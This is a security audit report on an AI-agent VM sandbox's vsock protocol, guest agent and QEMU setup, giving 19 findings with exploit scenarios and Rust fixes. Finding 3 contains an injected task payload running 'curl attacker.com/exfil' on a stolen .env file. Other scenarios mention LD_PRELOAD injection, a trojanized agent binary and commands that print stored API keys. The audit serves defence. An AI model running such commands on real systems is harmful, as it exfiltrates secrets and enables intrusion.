# VM Boundary Security Audit

**Date**: 2026-02-24
**Auditor**: sec-vm-boundary
**Scope**: vsock protocol, guest agent, QEMU configuration, VM boundary integrity
**Files audited**:
- `agentiso/src/vm/vsock.rs`
- `agentiso/src/vm/mod.rs`
- `agentiso/src/vm/microvm.rs`
- `agentiso/src/vm/qemu.rs`
- `agentiso/src/guest/mod.rs`
- `agentiso/src/guest/protocol.rs` (re-exported from `protocol/src/lib.rs`)
- `guest-agent/src/main.rs`
- `guest-agent/src/daemon.rs`
- `agentiso/src/mcp/tools.rs` (host-side validation)
- `agentiso/src/workspace/mod.rs` (vsock-related sections)

---

## Finding 1: Guest File Operations Have No Path Confinement

**Severity**: Medium
**File**: `guest-agent/src/main.rs:188-239` (handle_file_read), `242-281` (handle_file_write), `283-318` (handle_file_upload), `320-359` (handle_file_download)
**Description**: The guest agent handles `FileRead`, `FileWrite`, `FileUpload`, and `FileDownload` requests with no restriction on the filesystem path. Any absolute path is accepted, including `/proc/`, `/sys/`, `/dev/`, and the guest agent binary itself. While the guest runs as root inside its own VM (so this is not a host escape), it means any MCP client that owns the workspace can read `/etc/shadow`, overwrite the guest agent binary, or modify `/proc/self/oom_score_adj` to undo OOM protection.

**Exploit scenario**: A malicious MCP tool caller writes a trojanized `/usr/bin/agentiso-guest` binary, then kills the current guest agent (via `exec`). The next vsock connection attempt re-launches the trojanized binary.

**Risk assessment**: This is an expected trade-off -- the guest agent runs as root in a disposable VM and the VM *is* the isolation boundary. The guest has no way to escape the VM via file operations. However, integrity-sensitive paths could be protected.

**Recommendation**: Consider making the guest agent binary immutable after startup (`chattr +i`) or running it from a read-only mount. Alternatively, add an optional deny-list for sensitive paths like `/proc/self/`, `/sbin/init*`, and the guest agent binary path. This is a defense-in-depth measure, not a critical fix.

---

## Finding 2: Length-Prefix Allocation Up to 16 MiB Per Message

**Severity**: Medium
**File**: `protocol/src/lib.rs:11` (`MAX_MESSAGE_SIZE`), `guest-agent/src/main.rs:41-62`, `agentiso/src/guest/mod.rs:40-54`
**Description**: Both host and guest `read_message()` functions validate that the 4-byte length prefix does not exceed `MAX_MESSAGE_SIZE` (16 MiB). However, when the check passes, they allocate a `Vec<u8>` of exactly that size (`vec![0u8; len as usize]`). A sequence of 64 concurrent connections (the semaphore limit) each sending a message with length prefix `0x01000000` (16 MiB) would allocate 1 GiB of heap memory in the guest agent, potentially triggering OOM despite the `oom_score_adj=-1000` protection (which protects the process from the OOM killer but not from allocation failure).

On the host side (`agentiso/src/guest/mod.rs:40-54`), the same allocation occurs per vsock operation. Since the host creates fresh vsock connections per operation and there's no cap on concurrent workspace operations across all workspaces, a large number of concurrent file_download operations could force significant host memory consumption.

**Exploit scenario**: An attacker controls multiple workspaces and triggers large file downloads or crafted guest responses simultaneously, each advertising 16 MiB payloads. With 100 workspaces this could consume 1.6 GiB of host memory.

**Recommendation**: Reduce `MAX_MESSAGE_SIZE` to a more conservative value (e.g., 4 MiB) or implement streaming for large transfers. Alternatively, add a global memory budget for in-flight vsock messages. The 32 MiB file size limit in the guest already prevents legitimate payloads from reaching 16 MiB when base64-encoded (~43 MiB worst case for 32 MiB file), but the allocation cap should match actual needs.

```rust
// Suggested: reduce from 16 MiB to 4 MiB
pub const MAX_MESSAGE_SIZE: u32 = 4 * 1024 * 1024;
```

---

## Finding 3: Guest Agent HTTP API Listens on 0.0.0.0:8080

**Severity**: Medium
**File**: `guest-agent/src/main.rs:1200-1219`
**Description**: The guest agent starts an HTTP API on `0.0.0.0:8080` inside the VM. This API provides `/health`, `GET /messages`, and `POST /messages` endpoints. The `POST /messages` endpoint allows injecting arbitrary messages into the guest's inbox with no authentication. While the API is only reachable from the guest's network interface (controlled by nftables), if inter-VM communication is enabled (`allow_inter_vm`), other VMs on the bridge can reach this port and inject spoofed team messages.

**Exploit scenario**: VM-A has inter-VM access enabled and sends a POST to VM-B's port 8080 with `{"from": "team-lead", "content": "{\"task_id\":\"evil\",\"command\":\"curl attacker.com/exfil?data=$(cat /workspace/.env)\",\"timeout_secs\":300}", "message_type": "task_assignment"}`. The daemon in VM-B executes this as a task assignment.

**Recommendation**: Bind the HTTP API to `127.0.0.1` instead of `0.0.0.0`, since it is only needed for intra-guest communication.

```rust
// In guest-agent/src/main.rs:1207
let addr = "127.0.0.1:8080";  // was "0.0.0.0:8080"
```

---

## Finding 4: No Authentication on Relay vsock Channel

**Severity**: Low
**File**: `guest-agent/src/main.rs:1268-1344` (handle_relay_connection), `agentiso/src/vm/mod.rs:640-667` (connect_relay)
**Description**: The relay vsock channel (port 5001) accepts any incoming connection and processes `Ping` and `TeamMessage` requests. There is no handshake or authentication token to verify the connection comes from the legitimate host. Since vsock connections can only originate from the host (CID 2) to the guest, this is not directly exploitable -- the guest cannot initiate vsock connections to other guests. However, if a QEMU vulnerability allowed CID spoofing, relay messages could be injected.

**Risk assessment**: Very low practical risk. vsock CIDs are assigned by the kernel's vhost_vsock driver and cannot be spoofed from userspace. This finding is informational.

**Recommendation**: No immediate action required. For defense-in-depth, consider adding a simple shared secret to the relay handshake that the host sends during `connect_relay` and the guest validates.

---

## Finding 5: Exec Commands Bypass Env Blocklist via Per-Request env

**Severity**: Medium
**File**: `guest-agent/src/main.rs:97-186` (handle_exec), `guest-agent/src/main.rs:770-871` (handle_exec_background)
**Description**: The `SetEnv` handler (`handle_set_env`) correctly validates env var names against `DANGEROUS_ENV_NAMES` (PATH, IFS, ENV, BASH_ENV) and `DANGEROUS_ENV_PREFIXES` (LD_). However, the `Exec` and `ExecBackground` handlers apply per-request `env` overrides *after* the stored env vars, and per-request env vars are not validated against the same blocklist. This means an MCP client can bypass the env var restrictions by passing `LD_PRELOAD=/evil.so` in the per-request `env` field of an Exec call.

The per-request env is set at `guest-agent/src/main.rs:117-119`:
```rust
for (key, val) in &req.env {
    cmd.env(key, val);
}
```

And similarly for ExecBackground at line 782-786.

**Exploit scenario**: An MCP client calls `exec(workspace_id="...", command="whoami", env={"LD_PRELOAD": "/tmp/evil.so"})`. The LD_PRELOAD is applied to the command, allowing dynamic linker injection inside the guest. While this is within the VM boundary, it could be used to tamper with the guest agent's child processes in unexpected ways.

**Risk assessment**: The VM is the isolation boundary and exec already runs arbitrary commands, so LD_PRELOAD doesn't grant additional capabilities beyond what `exec` already provides. However, the inconsistency between SetEnv validation and per-request env is a defense-in-depth gap.

**Recommendation**: Apply the same `is_dangerous_env_name()` check to per-request env vars in `handle_exec` and `handle_exec_background`.

```rust
// In handle_exec, before applying per-request env:
for (key, _val) in &req.env {
    if is_dangerous_env_name(key) {
        return GuestResponse::Error(ErrorResponse {
            code: ErrorCode::InvalidRequest,
            message: format!("env var {:?} is not allowed in exec requests", key),
        });
    }
}
```

---

## Finding 6: QEMU Arguments Not Sanitized Against Workspace ID Injection

**Severity**: Low
**File**: `agentiso/src/vm/microvm.rs:37-123` (build_command), `agentiso/src/vm/mod.rs:123-279` (launch)
**Description**: The `VmConfig.build_command()` method constructs QEMU CLI arguments using `format!()` with values from the config struct. The `tap_device` field is formatted directly into the `-netdev` argument. If the tap device name contained commas or special QEMU option syntax (e.g., `tap0,vhost=on`), it could inject additional QEMU parameters.

However, the TAP device name is generated from the workspace UUID's first 8 hex characters (e.g., `tap-abcd1234`), which is guaranteed to be safe (hex chars + "tap-" prefix). The `mac_address` is generated from the IP via `mac_from_ip()`, also safe. The `vsock_cid` is a u32, so it's just a number.

**Risk assessment**: No exploitable injection path exists because all values are derived from controlled sources (UUIDs, IPs, numeric CIDs). The TAP name comes from `workspace_id.to_string()[..8]` which is hex-only.

**Recommendation**: No action required. The existing workspace name validation (`1-128 chars, alphanumeric/hyphen/underscore/dot`) prevents injection in derived names. For extra safety, the `build_command()` method could assert that the tap_device contains only `[a-zA-Z0-9-]` characters.

---

## Finding 7: CID Reuse Window After VM Destruction

**Severity**: Low
**File**: `agentiso/src/vm/mod.rs:326-436` (stop), `agentiso/src/vm/mod.rs:439-457` (force_kill)
**Description**: After a VM is stopped or force-killed, the `process.wait().await` call ensures the kernel releases the vsock CID. This is correctly implemented in all three error paths of `launch()` (lines 183, 204, 226) and in `stop()` (line 432) and `force_kill()` (line 453). The CID is released to the kernel's pool and may be reassigned to a new VM.

However, there is a theoretical race window: if a host-side vsock operation is in-flight (e.g., a long-running `exec` via a fresh vsock connection) when the VM is destroyed, and a new VM is immediately launched with the same CID (unlikely but possible with rapid create/destroy cycles), the in-flight operation could receive a response from the wrong VM.

**Risk assessment**: Very low. The CID pool is large (u32), and the kernel assigns CIDs sequentially. The host uses `fresh_vsock_client()` which creates new connections per operation, so stale connections are not reused. The primary risk is confusion (wrong response), not privilege escalation.

**Recommendation**: No immediate action. The current design of fresh connections per operation mitigates this well. If needed, add a nonce to the Ping/Pong handshake to verify the identity of the connected guest.

---

## Finding 8: Exec Output Read Into Unbounded Vec Before Truncation

**Severity**: Medium
**File**: `guest-agent/src/main.rs:150-165` (handle_exec output reading)
**Description**: In `handle_exec`, stdout and stderr are read into unbounded `Vec<u8>` buffers via `read_to_end()`, then truncated to `MAX_EXEC_OUTPUT_BYTES` (2 MiB). The `read_to_end` call reads the entire pipe output into memory before truncation. A command producing gigabytes of output (e.g., `yes | head -c 4G`) will cause a 4 GB allocation in the guest agent before truncation occurs.

The same pattern exists in `handle_exec_background` at lines 830-849.

**Exploit scenario**: An MCP client runs `exec(command="dd if=/dev/urandom bs=1M count=4096")`, causing the guest agent to allocate ~4 GiB of heap memory. With the OOM score adjustment, the guest agent survives but other processes in the VM die. Alternatively, the guest has limited memory (default 512 MB), so this would OOM the entire VM.

**Recommendation**: Use a bounded read instead of `read_to_end`. Read up to `MAX_EXEC_OUTPUT_BYTES + 1` bytes, then check if there's more to determine truncation.

```rust
// Replace read_to_end with bounded read:
let stdout = if let Some(mut out) = stdout_handle {
    let mut buf = vec![0u8; MAX_EXEC_OUTPUT_BYTES + 1];
    let mut total = 0;
    loop {
        let n = out.read(&mut buf[total..]).await.unwrap_or(0);
        if n == 0 { break; }
        total += n;
        if total >= buf.len() {
            // Drain remaining data without storing
            let mut discard = [0u8; 8192];
            while out.read(&mut discard).await.unwrap_or(0) > 0 {}
            break;
        }
    }
    buf.truncate(total.min(MAX_EXEC_OUTPUT_BYTES));
    String::from_utf8_lossy(&buf).into_owned()
} else {
    String::new()
};
```

---

## Finding 9: Host-Side File Transfer Path Traversal Prevention is Correct

**Severity**: Info (Positive Finding)
**File**: `agentiso/src/mcp/tools.rs:4093-4140` (validate_host_path_in_dir)
**Description**: The `validate_host_path_in_dir` function correctly prevents path traversal by canonicalizing both the transfer directory and the requested path, then verifying the canonical path starts with the canonical root. For uploads (must_exist=true), the full path is canonicalized. For downloads (must_exist=false), the parent directory is canonicalized and verified, which correctly handles `../` traversal attempts even when the target file doesn't exist yet.

**Recommendation**: No action required. Implementation is correct.

---

## Finding 10: HMP Tag Sanitization is Correct

**Severity**: Info (Positive Finding)
**File**: `agentiso/src/vm/qemu.rs:21-32` (validate_hmp_tag)
**Description**: The `validate_hmp_tag` function restricts tag names to `[a-zA-Z0-9._-]` with a 128-char limit, preventing HMP command injection via `savevm`/`loadvm`/`delvm`. Characters like `;`, space, and newlines are rejected. This correctly prevents injection of additional HMP commands.

**Recommendation**: No action required. Implementation is correct.

---

## Finding 11: ConfigureMcpBridge Token Not Scrubbed from Guest Memory

**Severity**: Low
**File**: `guest-agent/src/main.rs:1018-1088` (handle_configure_mcp_bridge)
**Description**: The `ConfigureMcpBridge` handler writes the auth token in plaintext to `/root/.config/opencode/config.jsonc`. The token remains on disk and readable by any process in the VM. If the VM is compromised (e.g., via a malicious OpenCode task), the attacker can read the MCP bridge token and use it to call host MCP tools scoped to that workspace.

**Risk assessment**: The token is per-workspace scoped, so compromise only affects the workspace that was already compromised. The auth token is a bearer token for the MCP bridge, granting access to tools the workspace agent already has. This is a circular dependency -- if the VM is compromised, the attacker already has exec access.

**Recommendation**: Consider making the config file readable only by root (`chmod 600`) and deleting it after OpenCode exits. The current implementation already uses `serde_json::json!()` for safe JSON serialization, preventing injection.

---

## Finding 12: SetEnv Values Cannot Be Read Back

**Severity**: Info (Positive Finding)
**File**: `guest-agent/src/main.rs:975-1004` (handle_set_env), `agentiso/src/vm/vsock.rs:705-716` (VsockClient::set_env)
**Description**: The guest agent stores env vars in an in-memory `HashMap` behind a mutex. There is no `GetEnv` or equivalent RPC to read stored values back. The only way to extract the values would be through `exec(command="env")`, which would show all environment variables of the shell process. This is by design -- the env store is write-only via the protocol.

**Recommendation**: No action required. However, note that `exec(command="env")` or `exec(command="printenv ANTHROPIC_API_KEY")` will reveal stored secrets. This is expected since exec runs arbitrary commands.

---

## Finding 13: Guest HTTP API Inbox Has No Authentication or Rate Limiting

**Severity**: Low
**File**: `guest-agent/src/main.rs:1237-1257` (http_post_message)
**Description**: The `POST /messages` HTTP endpoint has no authentication and accepts arbitrary JSON bodies. The inbox is capped at 1000 messages (older messages are evicted), but there is no rate limiting. A process within the VM (or a network neighbor if inter-VM is enabled) could flood the inbox with messages, evicting legitimate team messages.

**Risk assessment**: Low. The inbox cap prevents unbounded memory growth. The primary impact is denial of service for team messaging within that single VM.

**Recommendation**: Add rate limiting to the HTTP POST endpoint, or restrict it to localhost only (see Finding 3).

---

## Finding 14: Daemon Executes Task Commands Without Validation

**Severity**: Low
**File**: `guest-agent/src/daemon.rs:105-198` (execute_task)
**Description**: The daemon executes task assignment commands via `sh -c <command>` with no validation of the command content. As noted in the code comment at line 214: "Task commands are executed via `sh -c` inside the guest VM. The VM is the isolation boundary -- command injection within the VM is by design."

This is correct -- the VM boundary is the security control, not the command filter. However, the daemon also applies per-task `env` variables without the same blocklist checks as `SetEnv`.

**Recommendation**: Apply `DANGEROUS_ENV_NAMES`/`DANGEROUS_ENV_PREFIXES` checks to daemon task env vars for consistency.

---

## Finding 15: Vsock Connection Semaphore Correctly Limits Concurrency

**Severity**: Info (Positive Finding)
**File**: `guest-agent/src/main.rs:1735-1767` (main accept loop), `guest-agent/src/main.rs:1707-1727` (relay accept loop)
**Description**: Both the main vsock listener and the relay listener use a semaphore limited to 64 concurrent connections. The `acquire_owned()` pattern correctly ties the permit lifetime to the spawned task, releasing it when the connection handler exits (including on panic). This prevents connection flooding from the host.

**Recommendation**: No action required. Implementation is correct.

---

## Finding 16: Host-Side Message Size Validation is Correct

**Severity**: Info (Positive Finding)
**File**: `agentiso/src/guest/mod.rs:40-54` (host read_message), `protocol/src/lib.rs:11` (MAX_MESSAGE_SIZE)
**Description**: The host-side `read_message()` function checks `len > protocol::MAX_MESSAGE_SIZE` before allocation. The guest-side `read_message()` (in `guest-agent/src/main.rs:41-62`) performs the same check. Both sides reject messages exceeding 16 MiB.

**Recommendation**: See Finding 2 for the recommendation to reduce `MAX_MESSAGE_SIZE`.

---

## Finding 17: encode_message Can Produce Messages Exceeding MAX_MESSAGE_SIZE

**Severity**: Low
**File**: `protocol/src/lib.rs:618-625` (encode_message)
**Description**: The `encode_message` function serializes to JSON and prepends a 4-byte length prefix, but does not check whether the serialized JSON exceeds `MAX_MESSAGE_SIZE`. If a large response is constructed (e.g., exec stdout of 2 MiB), the encoded message may exceed the limit. The receiver will then reject it with a "message too large" error, but the sender has already allocated and serialized the full payload.

**Risk assessment**: Low. The guest truncates exec output to 2 MiB, and file operations are capped at 32 MiB. The receiver's check prevents processing, but the sender wastes resources.

**Recommendation**: Add a size check in `encode_message`:

```rust
pub fn encode_message<T: Serialize>(msg: &T) -> Result<Vec<u8>, serde_json::Error> {
    let json = serde_json::to_vec(msg)?;
    let len = json.len() as u32;
    // Note: Could add a check here: if len > MAX_MESSAGE_SIZE { return Err(...) }
    let mut buf = Vec::with_capacity(4 + json.len());
    buf.extend_from_slice(&len.to_be_bytes());
    buf.extend_from_slice(&json);
    Ok(buf)
}
```

---

## Finding 18: QEMU Process Gets kill_on_drop Protection

**Severity**: Info (Positive Finding)
**File**: `agentiso/src/vm/qemu.rs:389-393` (spawn_qemu)
**Description**: The QEMU child process is spawned with `.kill_on_drop(true)`, ensuring it is killed if the tokio Child handle is dropped. This prevents orphaned QEMU processes if the host daemon crashes or panics during VM lifecycle management.

**Recommendation**: No action required. Implementation is correct.

---

## Finding 19: No TLS/Encryption on vsock Channel

**Severity**: Info
**File**: `agentiso/src/vm/vsock.rs` (entire file), `guest-agent/src/main.rs` (entire file)
**Description**: The vsock protocol sends all data (including API keys via `SetEnv` and MCP bridge tokens via `ConfigureMcpBridge`) in plaintext JSON over the vsock channel. Since vsock uses virtio-socket (a memory-mapped transport between host and guest, not a network transport), the data never traverses a physical or virtual network. It passes through the host kernel's vhost_vsock driver directly to/from the guest's kernel vsock transport.

**Risk assessment**: Not a vulnerability. vsock data is not sniffable from the network. It would require host kernel compromise to intercept, at which point the attacker already has full access.

**Recommendation**: No action required. vsock provides adequate confidentiality for this use case.

---

## Summary

| # | Severity | Finding | Status |
|---|----------|---------|--------|
| 1 | Medium | Guest file ops have no path confinement | Accept (VM boundary) |
| 2 | Medium | 16 MiB allocation per message on length prefix | Fix recommended |
| 3 | Medium | HTTP API listens on 0.0.0.0 instead of 127.0.0.1 | Fix recommended |
| 4 | Low | No auth on relay vsock channel | Accept (vsock CID trust) |
| 5 | Medium | Per-request exec env bypasses blocklist | Fix recommended |
| 6 | Low | QEMU arg injection via workspace names | No risk (UUIDs only) |
| 7 | Low | CID reuse window after VM destroy | Accept (mitigated by fresh connections) |
| 8 | Medium | Exec output read into unbounded Vec | Fix recommended |
| 9 | Info | Host file transfer path traversal prevention correct | N/A |
| 10 | Info | HMP tag sanitization correct | N/A |
| 11 | Low | MCP bridge token on disk in guest | Accept (per-workspace scope) |
| 12 | Info | SetEnv values cannot be read back via protocol | N/A |
| 13 | Low | HTTP inbox has no auth or rate limit | Fix recommended (bind localhost) |
| 14 | Low | Daemon task env vars not validated | Fix recommended (consistency) |
| 15 | Info | vsock connection semaphore correct | N/A |
| 16 | Info | Host-side message size validation correct | N/A |
| 17 | Low | encode_message doesn't check MAX_MESSAGE_SIZE | Fix optional |
| 18 | Info | QEMU kill_on_drop protection present | N/A |
| 19 | Info | No TLS on vsock (not needed) | N/A |

### Priority Fixes

1. **Finding 3** (Medium): Bind guest HTTP API to `127.0.0.1:8080` -- single-line fix, eliminates cross-VM message injection vector
2. **Finding 5** (Medium): Apply env blocklist to per-request exec env vars -- defense-in-depth consistency
3. **Finding 8** (Medium): Use bounded reads for exec output -- prevents guest OOM from pathological commands
4. **Finding 2** (Medium): Reduce `MAX_MESSAGE_SIZE` or add global memory budget -- prevents coordinated allocation attacks

### No Critical Findings

The VM boundary is well-designed. vsock provides a clean, non-networkable communication channel. The guest agent is properly confined within QEMU's virtualization boundary. The host correctly validates inputs before sending them over vsock, and the guest validates inputs before acting on them. The dual-validation approach (host-side MCP validation + guest-side protocol validation) provides defense in depth.
